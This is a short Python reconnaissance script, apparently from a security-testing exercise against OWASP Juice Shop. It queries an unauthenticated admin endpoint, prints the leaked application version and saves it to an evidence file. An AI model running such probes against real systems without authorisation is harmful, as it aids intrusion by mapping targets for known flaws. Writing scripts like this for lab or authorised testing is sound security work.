#!/usr/bin/env python3
"""c01-version-leak: unauthenticated version disclosure against OWASP Juice Shop.

The endpoint /rest/admin/application-version is exposed without authentication
(Juice Shop's "Exposed Metrics"/"Outdated Allowlist"-class info leak family) and
returns {"version": "<x.y.z>"}.
"""
import json
import sys
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://host.docker.internal:3000"
PATH = "/rest/admin/application-version"


def main():
    url = BASE + PATH
    req = urllib.request.Request(url, headers={"User-Agent": "c01-recon/1.0"})
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode()
        print(f"[+] {url} -> HTTP {r.status}")
        print(f"[+] raw body: {body}")
        if "application-version" in r.headers.get("Content-Disposition", ""):
            pass
        version = json.loads(body)["version"]
        print(f"[+] leaked version: {version}")
        with open("/workspace/evidence/c1_version.txt", "w") as f:
            f.write(f"application: OWASP Juice Shop\n")
            f.write(f"version: {version}\n")
            f.write(f"endpoint: GET {url}\n")
            f.write(f"auth_required: no\n")
            f.write(f"evidence: response body = {body.strip()}\n")
        print("[+] wrote /workspace/evidence/c1_version.txt")


if __name__ == "__main__":
    main()
